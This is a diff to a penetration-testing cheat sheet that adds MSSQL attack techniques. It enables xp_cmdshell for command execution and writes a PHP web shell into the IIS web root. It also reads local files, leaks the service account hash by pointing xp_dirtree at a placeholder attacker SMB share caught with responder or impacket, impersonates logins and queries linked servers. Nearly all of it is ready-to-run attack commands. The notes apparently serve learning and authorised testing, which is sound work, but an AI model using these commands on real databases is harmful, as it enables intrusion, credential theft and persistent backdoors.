@@ -493,7 +493,7 @@ $ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql
 - mssql_ping  metaspolit
 
 ### MSSQL attack
-- rce 
+- **rce** 
 ```shell
 xp_cmdshell 'whoami'
 
@@ -502,10 +502,75 @@ EXECUTE sp_configure 'show advanced options', 1
 RECONFIGURE
 EXECUTE sp_configure 'xp_cmdshell', 1
 RECONFIGURE
+```
+- **Write Local Files**
+```shell
+# Enable Ole Automation Procedures to write files
+sp_configure 'show advanced options', 1
+RECONFIGURE
+sp_configure 'Ole Automation Procedures', 1
+RECONFIGURE
 
+# create file
+DECLARE @OLE INT
+DECLARE @FileID INT
+EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+EXECUTE sp_OADestroy @FileID
+EXECUTE sp_OADestroy @OLE
+```
+- **Read Local Files**
+```shell
+SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+```
+- **Capture MSSQL Service Hash**
+```shell
+EXEC master..xp_dirtree '\\<attcker ip>\share\'
+
+EXEC master..xp_subdirs '\\<attcker ip>\share\'
+```
+open the responder or  impacket
+```
+sudo responder -I tun0
+sudo impacket-smbserver share ./ -smb2support
+```
+catch the whole hash 
+![Screenshot_17](https://github.com/kiro6/penetration-testing-notes/assets/57776872/4eb852f0-5a37-4d2e-bafc-c40afaf7bcef)
+
+- **Impersonate Existing Users with MSSQL**
+prefereed to move the master DB using `USE master`
+```shell 
+# Identify Users that We Can Impersonate
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+
+# Verifying our Current User and Role
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+
+# Impersonating the amother user User
+EXECUTE AS LOGIN = 'another user'
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
 
 ```
-- 
+
+- **Communicate with Other Databases with MSSQL**
+```shell
+# Identify linked Servers in MSSQL
+SELECT srvname, isremote FROM sysservers
+
+srvname                             isremote
+----------------------------------- --------
+DESKTOP-MFERMN4\SQLEXPRESS          1
+10.0.0.12\SQLEXPRESS                0
+
+# where 1 means is a remote server
+
+# identify the user used for the connection and its privileges.
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+```
+
 
 ### Service Interaction
 ```bash
